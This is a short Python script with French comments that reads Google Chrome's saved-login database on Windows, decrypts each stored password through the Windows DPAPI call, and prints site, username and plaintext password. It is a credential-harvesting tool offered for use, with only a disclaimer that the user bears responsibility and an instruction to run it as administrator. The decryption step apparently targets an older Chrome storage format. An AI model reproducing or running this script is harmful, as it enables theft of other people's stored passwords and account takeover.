# Script qui affiche les mots de passe enregistrer sur Chrome :

# ATTENTION : L'utilisation est à votre total résponsabilité.
# Ouvrir le script avec les droits administrateur :

import os
import sqlite3
import win32crypt

def get_chrome_passwords():
    # Récupération du chemin vers le fichier de base de données de mots de passe de Chrome
    login_db = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")

    # Connexion à la base de données
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()

    # Sélection des mots de passe enregistrés
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    # Déchiffrement des mots de passe
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            print(f"Site: {result[0]}\nUtilisateur: {result[1]}\nMot de passe: {password.decode('utf-8')}\n")

if __name__ == "__main__":
    get_chrome_passwords()
